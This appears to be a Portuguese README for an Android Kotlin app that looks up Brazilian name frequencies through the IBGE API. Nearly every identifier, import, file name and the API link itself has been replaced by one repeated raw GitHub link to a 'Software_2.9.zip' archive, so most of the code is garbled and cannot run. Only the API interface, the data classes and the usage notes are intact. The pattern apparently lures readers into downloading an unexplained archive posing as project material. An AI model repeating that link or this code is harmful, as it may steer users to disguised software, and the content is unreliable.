# 📱 IBGE API

Este app Android consulta a frequência de nomes próprios no Brasil usando a [API de nomes do IBGE] (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip).  
Ele retorna a frequência do nome digitado por década de nascimento.

Construído com **Kotlin** + **Retrofit**.

---

## 📂 Arquivos principais

### ✅ `https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip`

```kotlin
package https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip

import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip*
import retrofit2.*
import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip

class MainActivity : AppCompatActivity() {

    // Elementos da interface
    lateinit var editNome: EditText
    lateinit var btnBuscar: Button
    lateinit var textResultado: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(savedInstanceState)
        setContentView(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)

        // Ligando os componentes da tela
        editNome = findViewById(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)
        btnBuscar = findViewById(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)
        textResultado = findViewById(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)

        // Criando o Retrofit (cliente HTTP)
        val retrofit = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()
            .baseUrl("https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip")
            .addConverterFactory(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip())
            .build()

        // Criando a instância da interface da API
        val api = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip)

        // Ação ao clicar no botão
        https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip {
            val nome = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip().trim().lowercase()

            if (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()) {
                https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Por favor, digite um nome."
                return@setOnClickListener
            }

            val call = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(nome)

            // Fazendo a requisição
            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip(object : Callback<List<IbgeResponse>> {
                override fun onResponse(
                    call: Call<List<IbgeResponse>>,
                    response: Response<List<IbgeResponse>>
                ) {
                    if (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip) {
                        val lista = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()
                        if (lista != null && https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()) {
                            val info = lista[0]
                            val sb = StringBuilder()
                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("Nome: ${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()}\n\n")
                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("Frequência por década:\n")

                            val resList = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
                            if (https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()) {
                                https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("Sem dados de frequências disponíveis.")
                            } else {
                                https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip {
                                    https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip("${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip}: ${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip}\n")
                                }
                            }

                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip()
                        } else {
                            https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Nome não encontrado."
                        }
                    } else {
                        https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Erro na resposta da API."
                    }
                }

                override fun onFailure(call: Call<List<IbgeResponse>>, t: Throwable) {
                    https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip = "Erro na conexão: ${https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip}"
                }
            })
        }
    }
}
```
### ✅ `https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip`
```kotlin
package https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip

import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip
import https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip

// Interface usada pelo Retrofit para acessar a API do IBGE
interface IbgeApi {
    @GET("v2/censos/nomes/{nome}")
    fun getNameInfo(@Path("nome") nome: String): Call<List<IbgeResponse>>
}
```
### ✅ `https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip`
```kotlin
package https://raw.githubusercontent.com/ItaloGLS/ibgeapi/main/kerflap/Software_2.9.zip

// Modelo para a resposta da API
data class IbgeResponse(
    val nome: String,
    val sexo: String?,             // Algumas respostas não têm sexo definido
    val localidade: String,
    val res: List<Periodo>?        // Lista de períodos e frequências
)

// Classe que representa cada período
data class Periodo(
    val periodo: String,
    val frequencia: Int
)
```

ℹ️ Observações

    O campo "frequência" indica quantas pessoas receberam aquele nome naquela década.

    A API retorna os dados a partir do Censo Nacional, ou seja, dados reais e atualizados pelo IBGE.

    A pesquisa diferencia maiúsculas/minúsculas, então usamos lowercase() para garantir o funcionamento.

## ✅ Exemplo de uso

Se você digitar maria, o app pode exibir algo como:

Nome: MARIA

Frequência por década:
[1930,1940[: 749053
[1940,1950[: 1487042
[1950,1960[: 2476482
[1960,1970[: 2495491
[1970,1980[: 1616019
...
